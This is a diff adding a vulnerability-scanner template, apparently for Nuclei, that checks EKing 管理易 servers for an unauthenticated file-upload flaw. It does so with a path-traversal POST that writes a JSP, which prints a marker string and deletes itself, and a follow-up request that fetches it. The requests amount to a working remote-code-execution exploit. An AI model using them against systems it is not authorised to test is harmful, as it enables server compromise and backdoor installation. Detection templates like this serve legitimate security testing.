@@ -1,0 +1,35 @@
+id: eking-FileUpload-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: EKing-管理易 FileUpload.ihtm 接口处存在文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传任意文件，在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/eking%E7%AE%A1%E7%90%86%E6%98%93FileUpload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{filename}}.jsp. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYec{{boundary}}
+        Content-Length: 348
+
+        --WebKitFormBoundaryHHaZAYec{{boundary}}
+        Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --WebKitFormBoundaryHHaZAYec{{boundary}}--
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
